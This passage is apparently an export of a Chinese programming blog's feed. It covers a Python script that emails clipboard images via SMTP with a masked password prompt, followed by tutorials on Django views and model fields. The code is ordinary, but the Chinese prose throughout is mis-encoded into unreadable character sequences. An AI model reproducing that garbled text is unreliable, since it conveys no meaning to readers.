<figure class="highlight yml"><table><tr><td class="code"><pre><span class="line"><span class="comment"># SMTP æœåŠ¡é…ç½®</span></span><br><span class="line"><span class="attr">smtp:</span></span><br><span class="line">  <span class="attr">username:</span> <span class="string">me@outlook.com</span></span><br><span class="line">  <span class="attr">password:</span></span><br><span class="line">  <span class="attr">host:</span> <span class="string">smtp.office365.com</span></span><br><span class="line">  <span class="attr">port:</span> <span class="number">587</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># é‚®ä»¶å‘é€é…ç½®</span></span><br><span class="line"><span class="attr">send:</span></span><br><span class="line">  <span class="comment"># å‘é€</span></span><br><span class="line">  <span class="attr">sender:</span> <span class="string">owq&lt;me@outlook.com&gt;</span></span><br><span class="line">  <span class="comment"># æ¥æ”¶</span></span><br><span class="line">  <span class="attr">receive:</span></span><br><span class="line">  <span class="bullet">-</span> <span class="string">example01@outlook.com</span></span><br><span class="line">  <span class="comment"># æŠ„é€</span></span><br><span class="line">  <span class="attr">cc:</span></span><br><span class="line">  <span class="bullet">-</span> <span class="string">example02@outlook.com</span></span><br><span class="line">  <span class="bullet">-</span> <span class="string">example03@outlook.com</span></span><br><span class="line">  <span class="comment"># å¯†é€</span></span><br><span class="line">  <span class="attr">bcc:</span></span><br><span class="line">  <span class="bullet">-</span> <span class="string">example04@outlook.com</span></span><br><span class="line">  <span class="bullet">-</span> <span class="string">example05@outlook.com</span></span><br></pre></td></tr></table></figure>

<p>åŠ è½½<code>yml</code>æ–‡ä»¶ç”¨çš„å‡½æ•°</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> yaml</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">load_yml</span>(<span class="params">conf_path:<span class="built_in">str</span></span>) -&gt; <span class="built_in">dict</span>:</span><br><span class="line">    <span class="string">&quot;&quot;&quot;Load .yml file &quot;&quot;&quot;</span></span><br><span class="line">    <span class="keyword">with</span> <span class="built_in">open</span>(file=conf_path, mode=<span class="string">&#x27;r&#x27;</span>, encoding=<span class="string">&quot;utf-8&quot;</span>) <span class="keyword">as</span> f:</span><br><span class="line">        <span class="keyword">return</span> yaml.load(stream=f, Loader=yaml.FullLoader)</span><br></pre></td></tr></table></figure>

<h3 id="å›¾ç‰‡æå–"><a href="#å›¾ç‰‡æå–" class="headerlink" title="å›¾ç‰‡æå–"></a>å›¾ç‰‡æå–</h3><p>ä½¿ç”¨<code>PIL</code>åº“ä»å‰ªè´´æ¿æå–å›¾ç‰‡ä¿å­˜</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> PIL <span class="keyword">import</span> Image, ImageGrab</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">save_paste_pic</span>(<span class="params">filename: <span class="built_in">str</span></span>) -&gt; <span class="built_in">bool</span>:</span><br><span class="line">    <span class="string">&quot;&quot;&quot; Save the clipboard picture &quot;&quot;&quot;</span></span><br><span class="line">    im = ImageGrab.grabclipboard()</span><br><span class="line">    <span class="keyword">if</span> <span class="built_in">isinstance</span>(im, Image.Image):</span><br><span class="line">        im.save(filename)</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">True</span></span><br><span class="line">    <span class="keyword">return</span> <span class="literal">False</span></span><br></pre></td></tr></table></figure>

<p><em>æ³¨: Mac æ¡Œé¢ç¯å¢ƒæš‚ä¸æ”¯æŒ</em></p>
<h3 id="å¯†æ–‡å¯†ç "><a href="#å¯†æ–‡å¯†ç " class="headerlink" title="å¯†æ–‡å¯†ç "></a>å¯†æ–‡å¯†ç </h3><p>å¯¹äºä¸æƒ³æŠŠå¯†ç ä¿å­˜åœ¨é…ç½®é‡Œçš„æƒ…å†µ, è¿™é‡Œå¯ä»¥å®šä¹‰ä¸€ä¸ªæ¨¡æ‹Ÿå¯†ç è¾“å…¥çš„å‡½æ•°.</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> msvcrt</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">input_password</span>(<span class="params">info: <span class="built_in">str</span> = <span class="string">&#x27;Password: &#x27;</span></span>) -&gt; <span class="built_in">tuple</span>:</span><br><span class="line">    <span class="string">&quot;&quot;&quot;shellå¯†ç è¾“å…¥</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">    æŒ‰é”®ç»‘å®š: å›è½¦ç¡®è®¤, é€€æ ¼åˆ é™¤, Esc/Ctrl+C é€€å‡º(ä¿¡å·ä¸ºFalse)</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">    :param info: è¾“å…¥æç¤ºä¿¡æ¯, defaults to &#x27;Password: &#x27;</span></span><br><span class="line"><span class="string">    :return: ä¿¡å·å’Œè¾“å…¥å¯†ç </span></span><br><span class="line"><span class="string">    :rtype: tuple</span></span><br><span class="line"><span class="string">    &quot;&quot;&quot;</span></span><br><span class="line">    <span class="built_in">print</span>(info, end=<span class="string">&#x27;&#x27;</span>, flush=<span class="literal">True</span>)</span><br><span class="line">    pawd_arr, sing = [], <span class="literal">False</span></span><br><span class="line">    <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line"></span><br><span class="line">        keypad = msvcrt.getch()</span><br><span class="line">        <span class="comment"># Enter</span></span><br><span class="line">        <span class="keyword">if</span> keypad == <span class="string">b&#x27;\r&#x27;</span>:</span><br><span class="line">            msvcrt.putch(<span class="string">b&#x27;\n&#x27;</span>)</span><br><span class="line">            sing = <span class="literal">True</span></span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">        <span class="comment"># Esc or Ctrl+C</span></span><br><span class="line">        <span class="keyword">elif</span> keypad <span class="keyword">in</span> [<span class="string">b&#x27;\x1b&#x27;</span>, <span class="string">b&#x27;\x03&#x27;</span>]:</span><br><span class="line">            msvcrt.putch(<span class="string">b&#x27;\n&#x27;</span>)</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">        <span class="comment"># Backspace</span></span><br><span class="line">        <span class="keyword">elif</span> keypad == <span class="string">b&#x27;\x08&#x27;</span>:</span><br><span class="line">            <span class="keyword">if</span> pawd_arr:</span><br><span class="line">                pawd_arr.pop()</span><br><span class="line">                msvcrt.putch(<span class="string">b&#x27;\b&#x27;</span>)</span><br><span class="line">                msvcrt.putch(<span class="string">b&#x27; &#x27;</span>)</span><br><span class="line">                msvcrt.putch(<span class="string">b&#x27;\b&#x27;</span>)</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            pawd_arr.append(keypad)</span><br><span class="line">            msvcrt.putch(<span class="string">b&#x27;*&#x27;</span>)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> sing, <span class="string">b&#x27;&#x27;</span>.join(pawd_arr).decode()</span><br></pre></td></tr></table></figure>

<center>â†“ æ•ˆæœæ˜¯è¿™æ ·å­ â†“</center>

<p><img data-src="http://img.owq.world/2022/05/1749-a5c938.gif"></p>
<p><em>æ³¨: ä»…é€‚ç”¨ Windows æ¡Œé¢ç¯å¢ƒ</em></p>
<h3 id="å°è£…å‡½æ•°"><a href="#å°è£…å‡½æ•°" class="headerlink" title="å°è£…å‡½æ•°"></a>å°è£…å‡½æ•°</h3><p>åˆ›å»º<code>templates\archive_pic.html</code>ç¼–å†™å†…å®¹æ¨¡æ¿, ä¾¿äºé‚®ä»¶å†…å®¹ä¿®æ”¹.</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;h1&gt;Archive&lt;/h1&gt;</span><br><span class="line">&#123;&#123; pic &#125;&#125;</span><br></pre></td></tr></table></figure>

<p>å®šä¹‰ä¸‹å‘é€é‚®ä»¶çš„å‡½æ•°</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">send_archive_email</span>(<span class="params">conf: <span class="built_in">dict</span>, img_path: <span class="built_in">str</span></span>):</span><br><span class="line">    <span class="string">&quot;&quot;&quot;åŠ è½½é…ç½®å‘é€é™„åŠ å›¾ç‰‡çš„å½’æ¡£é‚®ä»¶</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">    :param conf: å‘é€é…ç½®</span></span><br><span class="line"><span class="string">    :param img_path: å‘é€å›¾ç‰‡è·¯å¾„</span></span><br><span class="line"><span class="string">    &quot;&quot;&quot;</span></span><br><span class="line">    email = EmailSender(**conf[<span class="string">&#x27;smtp&#x27;</span>])</span><br><span class="line">    email.set_template_paths(html=<span class="string">&#x27;templates&#x27;</span>)</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        email.send(</span><br><span class="line">            **conf[<span class="string">&#x27;send&#x27;</span>],</span><br><span class="line">            subject=<span class="string">f&quot;Recorded in <span class="subst">&#123;time.strftime(<span class="string">&#x27;%b %d, %Y&#x27;</span>, time.localtime())&#125;</span>&quot;</span>,</span><br><span class="line">            html_template=<span class="string">&#x27;archive_pic.html&#x27;</span>,</span><br><span class="line">            body_images=&#123;<span class="string">&#x27;pic&#x27;</span>: img_path&#125;,</span><br><span class="line">        )</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&#x27;Email send done.&#x27;</span>)</span><br><span class="line">    <span class="keyword">except</span> smtplib.SMTPAuthenticationError:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&#x27;Authentication unsuccessful.&#x27;</span>)</span><br><span class="line">    <span class="keyword">except</span> smtplib.SMTPDataError:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&#x27;SMTP service exception, login authentication is required.&#x27;</span>)</span><br></pre></td></tr></table></figure>

<p>æ¥ä¸‹æ¥ç¼–å†™ä¸€ä¸‹æµç¨‹, å°±åŸºæœ¬å®Œæˆäº†~</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">main</span>():</span><br><span class="line">    <span class="string">&quot;&quot;&quot; è·å–å‰ªè´´æ¿å›¾ç‰‡æ·»åŠ åˆ°é‚®ä»¶å‘é€ &quot;&quot;&quot;</span></span><br><span class="line"></span><br><span class="line">    img_path = <span class="string">r&#x27;paste_pic.png&#x27;</span></span><br><span class="line">    <span class="keyword">if</span> save_paste_pic(img_path):</span><br><span class="line"></span><br><span class="line">        conf = load_yml(<span class="string">r&#x27;config/email_archive.yml&#x27;</span>)</span><br><span class="line">        <span class="keyword">if</span> <span class="keyword">not</span> conf[<span class="string">&#x27;smtp&#x27;</span>][<span class="string">&#x27;password&#x27;</span>]:</span><br><span class="line">            sign, password = input_password()</span><br><span class="line">            <span class="keyword">if</span> sign:</span><br><span class="line">                conf[<span class="string">&#x27;smtp&#x27;</span>][<span class="string">&#x27;password&#x27;</span>] = password</span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                <span class="keyword">return</span></span><br><span class="line"></span><br><span class="line">        send_archive_email(conf, img_path)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&#x27;Clipboard has no pictures!&#x27;</span>)</span><br></pre></td></tr></table></figure>

<h3 id="å¿«é€Ÿå¯åŠ¨"><a href="#å¿«é€Ÿå¯åŠ¨" class="headerlink" title="å¿«é€Ÿå¯åŠ¨"></a>å¿«é€Ÿå¯åŠ¨</h3><p>è¿™é‡Œä½¿ç”¨çš„æ˜¯<code>PowerShell</code>, æ‰“å¼€å®ƒçš„é…ç½®æ–‡ä»¶(æ²¡æœ‰éœ€è¦åˆ›å»º).</p>
<figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line">code <span class="variable">$profile</span></span><br></pre></td></tr></table></figure>

<p>åˆ›å»ºè¿è¡Œå‡½æ•°å’Œåˆ«å</p>
<figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">sendArchiveEmail</span></span> &#123;</span><br><span class="line">    <span class="variable">$Pwd</span> = <span class="built_in">Get-Location</span></span><br><span class="line">    <span class="built_in">Write-Output</span> <span class="string">&#x27;Start send_archive_email.py.&#x27;</span></span><br><span class="line">    <span class="built_in">cd</span> D:\Project\auto_email &amp;&amp; python send_archive_email.py</span><br><span class="line">    <span class="built_in">cd</span> <span class="variable">$Pwd</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="built_in">New-Alias</span> <span class="built_in">send-email</span> sendArchiveEmail</span><br></pre></td></tr></table></figure>

<p>åˆ·æ–°ç»ˆç«¯åä½¿ç”¨<code>send-email</code>å‘½ä»¤å°±å¯ä»¥å¯åŠ¨è„šæœ¬äº†</p>
<p><img data-src="http://img.owq.world/2022/05/2134-5ee714.gif"></p>
]]></content>
      <categories>
        <category>æŠ€æœ¯è®°å½•</category>
      </categories>
      <tags>
        <tag>Python</tag>
      </tags>
  </entry>
  <entry>
    <title>Django è§†å›¾å±‚</title>
    <url>/80aa4d4c/</url>
    <content><![CDATA[<h2 id="URLè°ƒåº¦å™¨"><a href="#URLè°ƒåº¦å™¨" class="headerlink" title="URLè°ƒåº¦å™¨"></a>URLè°ƒåº¦å™¨</h2><h3 id="urlpatterns"><a href="#urlpatterns" class="headerlink" title="urlpatterns"></a>urlpatterns</h3><blockquote>
<p>å½“æ¥æ”¶ä¸€ä¸ª<code>HttpRequest</code>å¯¹è±¡æ—¶, <code>Django</code>ä¼šè‡ªæŒ‰é¡ºåºéå†<code>urlpatterns</code>è¿›è¡ŒåŒ¹é….<br>å®ƒæ˜¯ <a href="https://docs.djangoproject.com/zh-hans/3.2/ref/urls/#django.urls.path"><code>django.urls.path()</code></a> å’Œ(æˆ–) <a href="https://docs.djangoproject.com/zh-hans/3.2/ref/urls/#django.urls.re_path"><code>django.urls.re_path()</code></a> å®ä¾‹çš„åºåˆ—</p>
</blockquote>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">urlpatterns = [</span><br><span class="line">    path(<span class="string">&#x27;articles/2003/&#x27;</span>, views.special_case_2003),</span><br><span class="line">    ...</span><br><span class="line">]</span><br></pre></td></tr></table></figure>

<h3 id="URLåŒ¹é…"><a href="#URLåŒ¹é…" class="headerlink" title="URLåŒ¹é…"></a>URLåŒ¹é…</h3><ul>
<li><p>å˜é‡åŒ¹é… --- <code>path()</code></p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">path(<span class="string">&#x27;&lt;int:question_id&gt;/vote/&#x27;</span>, views.vote, name=<span class="string">&#x27;vote&#x27;</span>),</span><br></pre></td></tr></table></figure>

<ul>
<li>è¦æ•è·çš„éƒ¨åˆ†ç”±<code>&lt;&gt;</code>åŒ…å›´.</li>
<li><code>int</code>ä»£è¡¨æ•°æ®ç±»å‹, ä¹Ÿå¯ä»¥æ˜¯<code>str</code>.</li>
<li>é»˜è®¤æ˜¯åœ¨è·¯å¾„çš„ç»“å°¾æ·»åŠ <code>/</code>.</li>
</ul>
</li>
<li><p>æ­£åˆ™åŒ¹é… --- <code>re_path()</code></p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">re_path(<span class="string">r&#x27;^(?P&lt;question_id&gt;\d+)/vote/$&#x27;</span>, views.vote, name=<span class="string">&#x27;vote&#x27;</span>)</span><br></pre></td></tr></table></figure>

<ul>
<li>æœ¬è´¨ä¸Šæ˜¯<code>re</code>æ¨¡å—çš„å°è£…</li>
<li><code>^</code> å’Œ <code>$</code> æ³¨æ„åŠ ä¸Š, é˜²æ­¢ä¸Šçº§è·¯å¾„æ•è·æ¬¡çº§è·¯å¾„</li>
</ul>
</li>
<li><p><code>include()</code></p>
<ul>
<li><code>include()</code>å¯ä»¥å°†å…¶ä»–<code>urlconf</code>æ·»åŠ åˆ°å½“å‰çš„<code>urlpatterns</code>åºåˆ—å½“ä¸­.</li>
</ul>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">path(<span class="string">&#x27;polls/&#x27;</span>, include(<span class="string">&#x27;polls.urls&#x27;</span>)),</span><br></pre></td></tr></table></figure>

<ul>
<li><p>ä¹Ÿå¯ä»¥å°†ç›¸åŒçš„è·¯å¾„å‰ç¼€ä¸‹åé¢çš„éƒ¨åˆ†ä¸€èµ·å£°æ˜.</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">path(<span class="string">&#x27;&lt;page_slug&gt;-&lt;page_id&gt;/&#x27;</span>, include([</span><br><span class="line">    path(<span class="string">&#x27;history/&#x27;</span>, views.history),</span><br><span class="line">    path(<span class="string">&#x27;edit/&#x27;</span>, views.edit),</span><br><span class="line">    path(<span class="string">&#x27;discuss/&#x27;</span>, views.discuss),</span><br><span class="line">    path(<span class="string">&#x27;permissions/&#x27;</span>, views.permissions),</span><br><span class="line">]))</span><br></pre></td></tr></table></figure></li>
</ul>
</li>
</ul>
<h2 id="HttpRequest"><a href="#HttpRequest" class="headerlink" title="HttpRequest"></a>HttpRequest</h2><h3 id="å±æ€§"><a href="#å±æ€§" class="headerlink" title="å±æ€§"></a>å±æ€§</h3><ul>
<li><p><code>HttpRequest.path</code><br>å½“å‰è¯·æ±‚è·¯å¾„</p>
</li>
<li><p><code>HttpRequest.body</code></p>
<p>å½“å‰è¯·æ±‚ä½“</p>
</li>
<li><p><code>HttpRequest.method</code><br>å½“å‰è¯·æ±‚æ–¹æ³•</p>
</li>
<li><p><code>HttpRequest.GET</code></p>
<p>GETæºå¸¦çš„<code>params</code>å‚æ•°</p>
</li>
<li><p><code>HttpRequest.POST</code><br>POSTæºå¸¦çš„<code>data</code>å‚æ•°</p>
</li>
<li><p><code>HttpRequest.COOKIES</code><br>cookies å­—å…¸</p>
</li>
<li><p><code>HttpRequest.FILES</code><br>ä¸Šä¼ çš„æ–‡ä»¶</p>
</li>
<li><p><code>HttpRequest.content_type</code><br>å½“å‰ä¼ è¾“æ•°æ®ç±»å‹</p>
</li>
<li><p><code>HttpRequest.session</code><br>è¯·æ±‚çš„æœåŠ¡å™¨ä¿¡æ¯</p>
</li>
<li><p><code>HttpRequest.META</code><br>åŒ…å«äº† HTTP å¤´æ–‡ä»¶çš„å­—å…¸</p>
</li>
</ul>
<h3 id="æ–¹æ³•"><a href="#æ–¹æ³•" class="headerlink" title="æ–¹æ³•"></a>æ–¹æ³•</h3><ul>
<li><p><code>get_host()</code></p>
<p>è·å–è¯·æ±‚ä¸»æœº</p>
</li>
</ul>
<h2 id="HttpResponse"><a href="#HttpResponse" class="headerlink" title="HttpResponse"></a>HttpResponse</h2><ul>
<li><p>æ¨¡æ¿ä½¿ç”¨</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> django.shortcuts <span class="keyword">import</span> render</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> render(request, <span class="string">&#x27;polls/results.html&#x27;</span>, &#123;<span class="string">&#x27;question&#x27;</span>: question&#125;)</span><br></pre></td></tr></table></figure>
</li>
<li><p>è¿”å›å­—ç¬¦ä¸²</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> django.http <span class="keyword">import</span> HttpResponse</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> HttpResponse(<span class="string">&quot;Here&#x27;s the text of the Web page.&quot;</span>)</span><br></pre></td></tr></table></figure>
</li>
<li><p>è¿”å›JSONæ ¼å¼çš„å­—ç¬¦ä¸²</p>
<blockquote>
<p>æœ¬è´¨ä¸Šå’Œ<code>HttpResponse(json.dumps(&#123;&#125;))</code>ä¸€æ ·,, ä½†æä¾›äº†æ›´å¤šåŠŸèƒ½.<br>é»˜è®¤åªæ¥å—<code>dict</code>æ ¼å¼, éœ€è¦è®¾ç½®<code>safe</code>ä¸º<code>False</code>æ‰èƒ½ä¼ å…¥å…¶å®ƒæ ¼å¼.</p>
</blockquote>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> django.http <span class="keyword">import</span> JsonResponse</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> JsonResponse(&#123;<span class="string">&#x27;foo&#x27;</span>: <span class="string">&#x27;bar&#x27;</span>&#125;, safe=<span class="literal">False</span>)</span><br></pre></td></tr></table></figure>
</li>
<li><p>è¿”å›æ–‡ä»¶</p>
<blockquote>
<p>ä¸»è¦æ˜¯ <code>Content-Disposition</code> é‡Œçš„å†…å®¹, è¿™é‡Œæ²¡æœ‰<code>Django</code>ç‰¹æœ‰çš„è¯­æ³•.</p>
</blockquote>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">response = HttpResponse(<span class="string">&#x27;test&#x27;</span>, headers=&#123;</span><br><span class="line">        <span class="string">&#x27;Content-Type&#x27;</span>: <span class="string">&#x27;application/octet-stream&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;Content-Disposition&#x27;</span>: <span class="string">&#x27;attachment; filename=&quot;test.txt&quot;&#x27;</span>,</span><br><span class="line">        &#125;)</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> response</span><br></pre></td></tr></table></figure>
</li>
<li><p>è¿”å›å¼‚å¸¸</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> django.http <span class="keyword">import</span> Http404</span><br><span class="line"></span><br><span class="line"><span class="keyword">raise</span> Http404(<span class="string">&#x27;Page not found&#x27;</span>)</span><br></pre></td></tr></table></figure></li>
</ul>
<h2 id="è§†å›¾"><a href="#è§†å›¾" class="headerlink" title="è§†å›¾"></a>è§†å›¾</h2><blockquote>
<p>ç®€å•äº†è§£ä¸‹4ç§HTTPåè®®è¯·æ±‚æ–¹å¼</p>
<p>GET	è·å–èµ„æº<br>POST	æ–°å»ºèµ„æº(æ›´æ–°èµ„æº)<br>PUT	æ›´æ”¹èµ„æº<br>DELETE åˆ é™¤èµ„æº</p>
</blockquote>
<h3 id="åŸºäºå‡½æ•°çš„è§†å›¾"><a href="#åŸºäºå‡½æ•°çš„è§†å›¾" class="headerlink" title="åŸºäºå‡½æ•°çš„è§†å›¾"></a>åŸºäºå‡½æ•°çš„è§†å›¾</h3><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">index</span>(<span class="params">request</span>):</span><br><span class="line">    <span class="keyword">return</span> HttpResponse(<span class="string">&quot;Hello, world. You&#x27;re at the polls index.&quot;</span>)</span><br></pre></td></tr></table></figure>

<p>å®ç°<code>RESTful api</code></p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">index_get</span>(<span class="params">request</span>):</span><br><span class="line">	<span class="keyword">pass</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">index_post</span>(<span class="params">request</span>):</span><br><span class="line">	<span class="keyword">pass</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">index_put</span>(<span class="params">request</span>):</span><br><span class="line">	<span class="keyword">pass</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">index_delete</span>(<span class="params">request</span>):</span><br><span class="line">	<span class="keyword">pass</span></span><br></pre></td></tr></table></figure>

<p>ç»‘å®šurl</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">path(<span class="string">&#x27;get&#x27;</span>, views.xxx, name=<span class="string">&#x27;index_get&#x27;</span>),</span><br><span class="line">...</span><br></pre></td></tr></table></figure>

<h3 id="åŸºäºç±»çš„è§†å›¾"><a href="#åŸºäºç±»çš„è§†å›¾" class="headerlink" title="åŸºäºç±»çš„è§†å›¾"></a>åŸºäºç±»çš„è§†å›¾</h3><blockquote>
<p>ä¸ç”¨å†™å¤šä¸ªç»‘å®š, è€Œä¸”å±‚æ¬¡åˆ†æ˜, æ¨¡å—å¼€å‘æ—¶ä¼˜é€‰.</p>
</blockquote>
<ol>
<li><p>ç»‘å®šurl</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">path(<span class="string">&#x27;&#x27;</span>, views.IndexView.as_view(), name=<span class="string">&#x27;index&#x27;</span>),</span><br></pre></td></tr></table></figure>
</li>
<li><p>åªéœ€è¦ç»‘å®šä¸€æ¬¡<code>path</code>,  ä¼šæ ¹æ®<code>HttpRequest.method</code>è‡ªåŠ¨é€‰æ‹©ç›¸åº”çš„å¤„ç†æ–¹æ³•.</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">IndexView</span>(generic.View):</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">get</span>(<span class="params">self, *args, **kwargs</span>):</span><br><span class="line">        <span class="keyword">pass</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">post</span>(<span class="params">self, *args, **kwargs</span>):</span><br><span class="line">        <span class="keyword">pass</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">put</span>(<span class="params">self, *args, **kwargs</span>):</span><br><span class="line">        <span class="keyword">pass</span></span><br><span class="line">    </span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">delete</span>(<span class="params">self, *args, **kwargs</span>):</span><br><span class="line">        <span class="keyword">pass</span></span><br></pre></td></tr></table></figure></li>
</ol>
]]></content>
      <categories>
        <category>å­¦ä¹ æ•™ç¨‹</category>
      </categories>
      <tags>
        <tag>Python</tag>
        <tag>Django</tag>
      </tags>
  </entry>
  <entry>
    <title>Django æ¨¡å‹å±‚</title>
    <url>/94470483/</url>
    <content><![CDATA[<h2 id="å­—æ®µç±»å‹"><a href="#å­—æ®µç±»å‹" class="headerlink" title="å­—æ®µç±»å‹"></a>å­—æ®µç±»å‹</h2><blockquote>
<p>Django æœ‰ä¸°å¯Œäº†å­—æ®µç±»å‹, ä¸ºé™ä½å­¦ä¹ æˆæœ¬, åŒæ—¶ä¹Ÿä¸ºäº†ç»´æŠ¤æ–¹ä¾¿, å°½é‡ä½¿ç”¨å’Œæ•°æ®åº“ä¸€è‡´çš„æ•°æ®ç±»å‹.</p>
</blockquote>
<h3 id="æ•°å­—ç±»"><a href="#æ•°å­—ç±»" class="headerlink" title="æ•°å­—ç±»"></a>æ•°å­—ç±»</h3><ul>
<li><code>IntegerField</code></li>
<li><code>BigIntField</code></li>
<li><code>FloatField</code></li>
<li><code>DecimalField</code></li>
</ul>
<h3 id="å­—ç¬¦ç±»"><a href="#å­—ç¬¦ç±»" class="headerlink" title="å­—ç¬¦ç±»"></a>å­—ç¬¦ç±»</h3><ul>
<li><p><code>CharField</code></p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># åœ¨MySQLä¸­å¯¹åº”çš„å°±æ˜¯varchar, æ‰€ä»¥å¿…é¡»æŒ‡å®šé•¿åº¦</span></span><br><span class="line">name = models.CharField(max_length=<span class="number">200</span>)</span><br></pre></td></tr></table></figure>
</li>
<li><p><code>TextField</code></p>
<p>é‡åˆ°å¤§çš„æ–‡ä»¶æˆ–å›¾ç‰‡æ—¶, å°†å…¶å­˜æ”¾åœ¨é™æ€èµ„æºæœåŠ¡å™¨, ç„¶åä½¿ç”¨URIæˆ–è€…URLå­˜å‚¨ä¼šæ›´åˆç†.</p>
</li>
</ul>
<h3 id="å¸¸ç”¨ç±»"><a href="#å¸¸ç”¨ç±»" class="headerlink" title="å¸¸ç”¨ç±»"></a>å¸¸ç”¨ç±»</h3><ul>
<li><p><code>BooleanField</code></p>
</li>
<li><p><code>DateField</code></p>
</li>
<li><p><code>DateTimeField</code></p>
</li>
<li><p><code>AutoField</code></p>
<p>æ²¡æœ‰æŒ‡å®šä¸»é”®æ—¶, å½“å‰æ¨¡å‹ä¼šè‡ªåŠ¨å°†ä¸€ä¸ªè‡ªå¢idçš„<code>IntegerField</code>åšä¸ºä¸»é”®.</p>
</li>
<li><p><code>ImageField</code><br>ç”¨æ¥åšç‰¹æ®Šçº¦æŸå’Œæ ¡éªŒçš„å­—æ®µ, ä¼šæ ¡éªŒä¼ å…¥æ•°æ®æ˜¯å¦å›¾ç‰‡.</p>
</li>
<li><p><code>EmailField</code></p>
<p>ç”¨æ¥åšç‰¹æ®Šçº¦æŸå’Œæ ¡éªŒçš„å­—æ®µ, ä¼šæ ¡éªŒä¼ å…¥æ•°æ®æ˜¯å¦é‚®ç®±åœ°å€.</p>
</li>
<li><p><code>UUIDField</code><br>ä¸€èˆ¬æ¥è¯´, <code>uuid</code>ä¼šç”¨ä½œå½“å‰æ•°æ®è¡¨çš„ä¸»é”®.</p>
</li>
</ul>
<h2 id="å­—æ®µé€‰é¡¹-x2F-çº¦æŸ"><a href="#å­—æ®µé€‰é¡¹-x2F-çº¦æŸ" class="headerlink" title="å­—æ®µé€‰é¡¹&#x2F;çº¦æŸ"></a>å­—æ®µé€‰é¡¹&#x2F;çº¦æŸ</h2><ul>
<li><p><code>primary_key</code><br>å¦‚æœä¸º<code>True</code>, å°†å½“å‰å­—æ®µè®¾ç½®ä¸ºä¸»é”®, é»˜è®¤ä¸º<code>False</code>.</p>
</li>
<li><p><code>null</code></p>
<p>å¦‚æœä¸º<code>True</code>ï¼Œ <code>Django</code>å°†åœ¨æ•°æ®åº“ä¸­å­˜å‚¨ç©ºå€¼ä¸º <code>NULL</code>, é»˜è®¤ä¸º <code>False</code>.</p>
</li>
<li><p><code>blank</code><br>ä»£è¡¨ç©ºç™½å­—ç¬¦<code>&quot;&quot;</code>, å¦‚æœæ˜¯<code>True</code>, å½“å‰å­—æ®µå…è®¸ä¸ºç©º, é»˜è®¤ä¸º<code>False</code></p>
<blockquote>
<p><code>null</code>æ˜¯æ•°æ®åº“ä¸Šçš„è®¾ç½®, <code>blank</code>æ˜¯å­—æ®µéªŒè¯ä¸Šçš„è®¾ç½®.<br><code>blank</code>è®¾ç½®çš„å­—æ®µä¸å¯ä»¥ä¸º<code>NULL</code>.</p>
</blockquote>
</li>
